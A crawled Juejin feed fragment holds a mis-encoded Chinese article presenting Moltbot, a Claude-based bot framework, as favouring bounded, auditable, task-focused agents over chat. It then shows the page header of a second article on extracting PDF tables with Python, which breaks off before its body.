                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FHIzL5jDluuRKL4ZVOmrkqA" target="_blank" title="https://mp.weixin.qq.com/s/HIzL5jDluuRKL4ZVOmrkqA" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/HIzL5jDluâ€¦</a></p>
<p>Moltbot å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fclawd.bot%2F" target="_blank" title="https://clawd.bot/" ref="nofollow noopener noreferrer">clawd.bot/</a></p>
<p>GitHubï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmoltbot%2Fmoltbot" target="_blank" title="https://github.com/moltbot/moltbot" ref="nofollow noopener noreferrer">github.com/moltbot/molâ€¦</a></p>
<hr/>
<p>Clawdbotæ”¹åMoltbot</p>
<p>è¿‡å»ä¸€æ®µæ—¶é—´ï¼Œå¤§æ¨¡å‹é¢†åŸŸçš„è®¨è®ºï¼Œæ­£åœ¨æ‚„ç„¶å‘ç”Ÿå˜åŒ–ã€‚</p>
<p>æœ€æ—©çš„æ—¶å€™ï¼Œå¤§å®¶å…³æ³¨çš„æ˜¯<strong>æ¨¡å‹æœ¬èº«</strong>ï¼š
å‚æ•°è§„æ¨¡ã€ä¸Šä¸‹æ–‡é•¿åº¦ã€æ¨ç†èƒ½åŠ›ã€å¯¹è¯è¡¨ç°ã€‚</p>
<p>éšåï¼ŒæŠ€æœ¯è®¨è®ºé€æ¸è½¬å‘ <strong>Prompt å·¥ç¨‹</strong>ï¼š
å¦‚ä½•å†™ Prompt æ‰æ›´ç¨³å®šï¼Œå¦‚ä½•å‡å°‘å¹»è§‰ï¼Œå¦‚ä½•æ§åˆ¶è¾“å‡ºé£æ ¼ã€‚</p>
<p>è€Œå½“è¶Šæ¥è¶Šå¤šå›¢é˜ŸçœŸæ­£å°è¯•æŠŠå¤§æ¨¡å‹æ¥å…¥åˆ°ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªæ›´ç°å®çš„é—®é¢˜å¼€å§‹æµ®å‡ºæ°´é¢ï¼š</p>
<blockquote>
<p><strong>çœŸæ­£éš¾çš„ï¼Œä»æ¥ä¸æ˜¯â€œè®©æ¨¡å‹è¯´è¯â€ï¼Œè€Œæ˜¯â€œè®©æ¨¡å‹åšäº‹â€ã€‚</strong></p>
</blockquote>
<p>Moltbotï¼Œæ­£æ˜¯åœ¨è¿™æ ·ä¸€ä¸ªèƒŒæ™¯ä¸‹ï¼Œé€æ¸è¿›å…¥å·¥ç¨‹è§†é‡çš„ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆâ€œèŠå¤©å¼ AIâ€å¾ˆéš¾çœŸæ­£è½åœ°ï¼Ÿ</h2>
<p>å¾ˆå¤šå›¢é˜Ÿåœ¨å¼•å…¥ Claude æˆ–å…¶ä»–å¤§æ¨¡å‹æ—¶ï¼Œå¾€å¾€ä¼šä»ä¸€ä¸ªæœ€ç®€å•çš„å½¢æ€å¼€å§‹ï¼š</p>
<ul>
<li>ä¸€ä¸ªå¯¹è¯æ¡†</li>
<li>ä¸€æ®µ Prompt</li>
<li>ä¸€æ¬¡ API è°ƒç”¨</li>
</ul>
<p>åœ¨ Demo é˜¶æ®µï¼Œè¿™æ ·çš„æ–¹å¼å¾€å¾€æ•ˆæœä¸é”™ã€‚</p>
<p>ä½†å½“ä½ å°è¯•æŠŠå®ƒç”¨äºçœŸå®ä¸šåŠ¡ï¼Œå¾ˆå¿«å°±ä¼šé‡åˆ°ä¸€ç³»åˆ—é—®é¢˜ï¼š</p>
<ul>
<li>ç”¨æˆ·æé—®æ–¹å¼é«˜åº¦ä¸å¯æ§</li>
<li>è¾“å‡ºå†…å®¹éš¾ä»¥è¢«ç³»ç»Ÿç¨³å®šè§£æ</li>
<li>å¤šè½®å¯¹è¯çŠ¶æ€æ··ä¹±</li>
<li>å‡ºé”™åæ— æ³•å›æ»šæˆ–å…œåº•</li>
<li>æ¨¡å‹â€œè‡ªç”±å‘æŒ¥â€ï¼Œä½†ä¸šåŠ¡ä¸èƒ½æ¥å—</li>
</ul>
<p>è¿™æ—¶ä½ ä¼šæ„è¯†åˆ°ä¸€ä¸ªå…³é”®äº‹å®ï¼š</p>
<blockquote>
<p><strong>èŠå¤©ï¼Œéå¸¸é€‚åˆå±•ç¤ºæ¨¡å‹èƒ½åŠ›ï¼Œä½†å¹¶ä¸é€‚åˆæ‰¿è½½å¤æ‚ä»»åŠ¡ã€‚</strong></p>
</blockquote>
<p>è€Œä¼ä¸šçœŸæ­£éœ€è¦çš„ï¼Œå¾€å¾€ä¸æ˜¯ä¸€ä¸ªâ€œèƒ½èŠå¤©çš„ AIâ€ï¼Œ
è€Œæ˜¯ä¸€ä¸ª <strong>å¯ä»¥åµŒå…¥æµç¨‹ã€è¢«çº¦æŸè¡Œä¸ºã€è¢«å®¡è®¡ç»“æœçš„ Bot</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€Moltbot çš„æ ¸å¿ƒå®šä½ï¼šBotï¼Œè€Œä¸æ˜¯ Chat</h2>
<p>ç†è§£ Moltbotï¼Œé¦–å…ˆè¦åŒºåˆ†ä¸‰ä¸ªæ¦‚å¿µï¼š</p>
<ul>
<li><strong>æ¨¡å‹ï¼ˆModelï¼‰</strong>ï¼šClaude æœ¬èº«çš„æ¨ç†ä¸ç”Ÿæˆèƒ½åŠ›</li>
<li><strong>èŠå¤©åº”ç”¨ï¼ˆChat Appï¼‰</strong>ï¼šå›´ç»•å¯¹è¯ä½“éªŒæ„å»ºçš„äº¤äº’å½¢å¼</li>
<li><strong>Bot / Agent</strong>ï¼šå›´ç»•æ˜ç¡®ç›®æ ‡æ„å»ºçš„æ‰§è¡Œå•å…ƒ</li>
</ul>
<p>Moltbot çš„å®šä½ï¼Œæ˜æ˜¾åå‘ç¬¬ä¸‰ç§ã€‚</p>
<p>å®ƒå¹¶ä¸æ˜¯è¯•å›¾æŠŠ Claude åŒ…è£…æˆâ€œæ›´èªæ˜çš„èŠå¤©å·¥å…·â€ï¼Œ
è€Œæ˜¯å…³æ³¨ä¸€ä¸ªæ›´å·¥ç¨‹åŒ–çš„é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>å¦‚ä½•è®© Claude åœ¨å¯æ§è¾¹ç•Œå†…ï¼Œç¨³å®šã€å¯å¤ç°åœ°å®Œæˆä¸€ç±»ä»»åŠ¡ï¼Ÿ</strong></p>
</blockquote>
<p>è¿™ä¹Ÿå†³å®šäº† Moltbot çš„è®¾è®¡é‡ç‚¹ï¼Œä»ä¸€å¼€å§‹å°±ä¸æ˜¯â€œå¯¹è¯ä½“éªŒâ€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>è¡Œä¸ºçº¦æŸ</li>
<li>ä»»åŠ¡ç»“æ„</li>
<li>å·¥ç¨‹å¯æ§æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ä»å·¥ç¨‹è§†è§’çœ‹ï¼ŒMoltbot è§£å†³äº†å“ªäº›å…³é”®é—®é¢˜ï¼Ÿ</h2>
<h3 data-id="heading-3">ä»â€œè‡ªç”±è¾“å…¥â€åˆ°â€œå—æ§æŒ‡ä»¤â€</h3>
<p>ä¼ ç»ŸèŠå¤©æ¨¡å¼ä¸‹ï¼Œæ¨¡å‹é¢å¯¹çš„æ˜¯é«˜åº¦ä¸ç¡®å®šçš„è‡ªç„¶è¯­è¨€ã€‚</p>
<p>è€Œåœ¨ Moltbot çš„è®¾è®¡ç†å¿µä¸­ï¼Œæ›´å¼ºè°ƒï¼š</p>
<ul>
<li>æ˜ç¡®çš„ä»»åŠ¡è¾¹ç•Œ</li>
<li>ç»“æ„åŒ–æˆ–åŠç»“æ„åŒ–è¾“å…¥</li>
<li>æ¸…æ™°çš„ç›®æ ‡å®šä¹‰</li>
</ul>
<p>æ¨¡å‹ä¸å†â€œéšæ„å‘æŒ¥â€ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªè¢«é™å®šçš„é—®é¢˜ç©ºé—´ä¸­å·¥ä½œã€‚</p>
<hr/>
<h3 data-id="heading-4">ä»â€œè‡ªç„¶è¯­è¨€å›ç­”â€åˆ°â€œå¯æ‰§è¡Œç»“æœâ€</h3>
<p>åœ¨çœŸå®ç³»ç»Ÿä¸­ï¼Œæ¨¡å‹è¾“å‡ºå¾€å¾€ä¸æ˜¯ç»™äººç›´æ¥é˜…è¯»çš„ï¼Œè€Œæ˜¯è¦äº¤ç»™ç¨‹åºç»§ç»­å¤„ç†ã€‚</p>
<p>è¿™æ„å‘³ç€è¾“å‡ºå¿…é¡»å…·å¤‡ï¼š</p>
<ul>
<li>ç¨³å®šæ ¼å¼</li>
<li>å¯è§£æç»“æ„</li>
<li>å¯æ ¡éªŒç»“æœ</li>
</ul>
<p>Moltbot æ›´å¼ºè°ƒè¿™ç§<strong>å·¥ç¨‹å‹å¥½çš„è¾“å‡ºæ–¹å¼</strong>ï¼Œè€Œä¸æ˜¯è¿½æ±‚è¯­è¨€è¡¨ç°åŠ›ã€‚</p>
<hr/>
<h3 data-id="heading-5">ä»â€œå¤šè½®èŠå¤©â€åˆ°â€œä»»åŠ¡çŠ¶æ€ç®¡ç†â€</h3>
<p>å¤šè½®å¯¹è¯åœ¨å·¥ç¨‹ä¸ŠçœŸæ­£çš„éš¾ç‚¹ï¼Œä»æ¥ä¸åœ¨æ¨¡å‹ï¼Œè€Œåœ¨çŠ¶æ€ã€‚</p>
<p>Moltbot æ›´æ¥è¿‘ä¸€ç§ï¼š</p>
<ul>
<li>æ˜¾å¼çŠ¶æ€</li>
<li>å¯è¿½è¸ªæµç¨‹</li>
<li>å¯ä¸­æ–­ã€å¯æ¢å¤</li>
</ul>
<p>çš„ä»»åŠ¡æ‰§è¡Œæ¨¡å‹ã€‚</p>
<p>è¿™è®© Bot æ›´åƒä¸€ä¸ª<strong>å…·å¤‡ç”Ÿå‘½å‘¨æœŸçš„ç³»ç»Ÿç»„ä»¶</strong>ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ¬¡éšæœºå¯¹è¯ã€‚</p>
<hr/>
<h2 data-id="heading-6">å››ã€ä» Agent è§†è§’é‡æ–°ç†è§£ Moltbot</h2>
<p>å¦‚æœä» Agent çš„è§’åº¦æ¥çœ‹ï¼ŒMoltbot ä½“ç°äº†å‡ ä¸ªéå¸¸æˆç†Ÿçš„å·¥ç¨‹å…±è¯†ã€‚</p>
<h3 data-id="heading-7">ä»»åŠ¡ä¼˜å…ˆï¼Œè€Œä¸æ˜¯å¯¹è¯ä¼˜å…ˆ</h3>
<p>Agent çš„ä»·å€¼ï¼Œä¸åœ¨äºâ€œèŠå¾—å¤šè‡ªç„¶â€ï¼Œè€Œåœ¨äºï¼š</p>
<ul>
<li>æ˜¯å¦èƒ½æ‹†è§£ä»»åŠ¡</li>
<li>æ˜¯å¦èƒ½é€‰æ‹©æ­£ç¡®çš„å·¥å…·</li>
<li>æ˜¯å¦èƒ½åœ¨å¤±è´¥æ—¶å…œåº•</li>
</ul>
<p>Moltbot æ˜æ˜¾æ˜¯å›´ç»•â€œå®Œæˆç›®æ ‡â€æ¥è®¾è®¡çš„ã€‚</p>
<hr/>
<h3 data-id="heading-8">å·¥å…·æ˜¯èƒ½åŠ›è¾¹ç•Œçš„å»¶ä¼¸</h3>
<p>ä»»ä½•ä¸€ä¸ªä¸¥è‚ƒçš„ Agentï¼Œéƒ½ä¸å¯èƒ½åªä¾èµ–æ¨¡å‹æœ¬èº«ã€‚</p>
<p>åœ¨ Moltbot çš„å·¥ç¨‹æ€è·¯ä¸­ï¼š</p>
<ul>
<li>æ¨¡å‹è´Ÿè´£åˆ¤æ–­</li>
<li>å·¥å…·è´Ÿè´£æ‰§è¡Œ</li>
</ul>
<p>è¿™ç§åˆ†å·¥è®©ç³»ç»Ÿæ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å¯é ã€‚</p>
<hr/>
<h3 data-id="heading-9">å¯æ§æ€§ï¼Œæ°¸è¿œé«˜äºè‡ªä¸»æ€§</h3>
<p>åœ¨æ¼”ç¤ºåœºæ™¯ä¸­ï¼Œé«˜è‡ªä¸»æ€§å¾€å¾€æ„å‘³ç€â€œæ›´åƒäººâ€ï¼›
åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œé«˜è‡ªä¸»æ€§å¾€å¾€æ„å‘³ç€â€œé«˜é£é™©â€ã€‚</p>
<p>Moltbot çš„è®¾è®¡å–å‘éå¸¸æ˜ç¡®ï¼š</p>
<blockquote>
<p><strong>å®å¯ä¿å®ˆä¸€ç‚¹ï¼Œä¹Ÿè¦ç¨³å®šå¯æ§ã€‚</strong></p>
</blockquote>
<p>è¿™æ­£æ˜¯å·¥ç¨‹æ€ç»´ï¼Œè€Œä¸æ˜¯ç©å…·æ€ç»´ã€‚</p>
<hr/>
<h2 data-id="heading-10">äº”ã€Moltbot æ›´é€‚åˆå“ªäº›çœŸå®åœºæ™¯ï¼Ÿ</h2>
<p>ä»å·¥ç¨‹å®è·µè§’åº¦çœ‹ï¼ŒMoltbot æ›´é€‚åˆï¼š</p>
<ul>
<li>ä¼ä¸šå†…éƒ¨æµç¨‹ Bot</li>
<li>ç ”å‘è¾…åŠ©å·¥å…·</li>
<li>æ•°æ®å¤„ç†ä¸åˆ†æ</li>
<li>è§„åˆ™æ˜ç¡®ã€ç›®æ ‡æ¸…æ™°çš„è‡ªåŠ¨åŒ–ä»»åŠ¡</li>
</ul>
<p>è€Œå®ƒå¹¶ä¸è¿½æ±‚ï¼š</p>
<ul>
<li>æƒ…æ„Ÿé™ªä¼´</li>
<li>é—²èŠäº’åŠ¨</li>
<li>é«˜åº¦å¼€æ”¾å¼åˆ›ä½œ</li>
</ul>
<p>è¿™æ˜¯ä¸€æ¬¡æ¸…é†’è€Œç†æ€§çš„å–èˆã€‚</p>
<hr/>
<h2 data-id="heading-11">å…­ã€ä¸€ä¸ªå¸¸è¢«å¿½è§†çš„ä»·å€¼ï¼šå·¥ç¨‹è®¤çŸ¥çš„å˜åŒ–</h2>
<p>åœ¨ä½¿ç”¨ Moltbot è¿™ç±»æ¡†æ¶çš„è¿‡ç¨‹ä¸­ï¼Œå¼€å‘è€…å¾€å¾€ä¼šç»å†ä¸€æ¬¡æ˜æ˜¾çš„è½¬å˜ã€‚</p>
<p>æœ€åˆä½ å…³æ³¨çš„æ˜¯ï¼š</p>
<ul>
<li>Prompt æ€ä¹ˆå†™</li>
<li>æ¨¡å‹æ•ˆæœå¥½ä¸å¥½</li>
</ul>
<p>ä½†æ…¢æ…¢åœ°ï¼Œä½ å¼€å§‹å…³å¿ƒï¼š</p>
<ul>
<li>Prompt æ˜¯å¦åº”è¯¥æ¨¡æ¿åŒ–</li>
<li>çŠ¶æ€æ˜¯å¦åº”è¯¥å¤–ç½®</li>
<li>è¾“å‡ºæ˜¯å¦éœ€è¦æ ¡éªŒ</li>
<li>è¡Œä¸ºæ˜¯å¦éœ€è¦å®¡è®¡</li>
</ul>
<p>è¿™æ„å‘³ç€ä½ å·²ç»å¼€å§‹<strong>æŠŠ AI å½“æˆç³»ç»Ÿçš„ä¸€éƒ¨åˆ†æ¥è®¾è®¡</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-12">ä¸ƒã€ä» Moltbot çœ‹ AI åº”ç”¨çš„é•¿æœŸæ–¹å‘</h2>
<p>Moltbot å¹¶ä¸æ˜¯æ‰€è°“çš„â€œç»ˆææ–¹æ¡ˆâ€ï¼Œ
ä½†å®ƒé‡Šæ”¾äº†ä¸€ä¸ªéå¸¸æ¸…æ™°çš„ä¿¡å·ï¼š</p>
<blockquote>
<p><strong>AI åº”ç”¨æ­£åœ¨ä»â€œå±•ç¤ºæ™ºèƒ½â€ï¼Œèµ°å‘â€œå·¥ç¨‹æ‰§è¡Œâ€ã€‚</strong></p>
</blockquote>
<p>æœªæ¥çœŸæ­£æœ‰ä»·å€¼çš„ AI ç³»ç»Ÿï¼Œå¾€å¾€å…·å¤‡ï¼š</p>
<ul>
<li>æ¨¡å‹å¯æ›¿æ¢</li>
<li>è¡Œä¸ºå¯çº¦æŸ</li>
<li>ç»“æœå¯å›æº¯</li>
<li>é£é™©å¯æ§åˆ¶</li>
</ul>
<p>è€Œè¿™äº›ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯å·¥ç¨‹é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-13">å†™åœ¨æœ€å</h2>
<p>å¦‚æœè¯´å‰ä¸€é˜¶æ®µçš„å¤§æ¨¡å‹æµªæ½®ï¼Œè®©æˆ‘ä»¬çœ‹åˆ°äº†â€œæ™ºèƒ½çš„å¯èƒ½æ€§â€ï¼Œ
é‚£ä¹ˆç°åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ­£åœ¨è€ƒéªŒçš„æ˜¯ï¼š</p>
<blockquote>
<p><strong>è°èƒ½æŠŠæ™ºèƒ½ï¼Œå˜æˆå¯é ã€å¯æŒç»­çš„å·¥ç¨‹èƒ½åŠ›ã€‚</strong></p>
</blockquote>
<p>Moltbot çš„æ„ä¹‰ï¼Œå¹¶ä¸åœ¨äºå®ƒä½¿ç”¨äº† Claudeï¼Œ
è€Œåœ¨äºå®ƒä»£è¡¨äº†ä¸€ç§ <strong>æ›´æˆç†Ÿã€æ›´åŠ¡å®çš„ AI å·¥ç¨‹è·¯å¾„</strong>ã€‚</p>
<p>å¯¹äºçœŸæ­£æƒ³æŠŠå¤§æ¨¡å‹è½åœ°çš„å¼€å‘è€…æ¥è¯´ï¼Œè¿™ç±»å®è·µï¼Œè¿œæ¯”è¿½é€æ¨¡å‹å‚æ•°æ›´å€¼å¾—æŠ•å…¥ç²¾åŠ›ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ Python é«˜æ•ˆæå– PDF ä¸­çš„è¡¨æ ¼æ•°æ®å¹¶å¯¼å‡ºä¸º TXT æˆ– Excel]]></title>    <link>https://juejin.cn/post/7600414546189090826</link>    <guid>https://juejin.cn/post/7600414546189090826</guid>    <pubDate>2026-01-29T07:41:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600414546189090826" data-draft-id="7600380007886733362" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ Python é«˜æ•ˆæå– PDF ä¸­çš„è¡¨æ ¼æ•°æ®å¹¶å¯¼å‡ºä¸º TXT æˆ– Excel"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-29T07:41:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§å°šæ¥ä¹Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/1681597639955488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ Python é«˜æ•ˆæå– PDF ä¸­çš„è¡¨æ ¼æ•°æ®å¹¶å¯¼å‡ºä¸º TXT æˆ– Excel
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1681597639955488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§å°šæ¥ä¹Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:41:40.000Z" title="Thu Jan 29 2026 07:41:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body 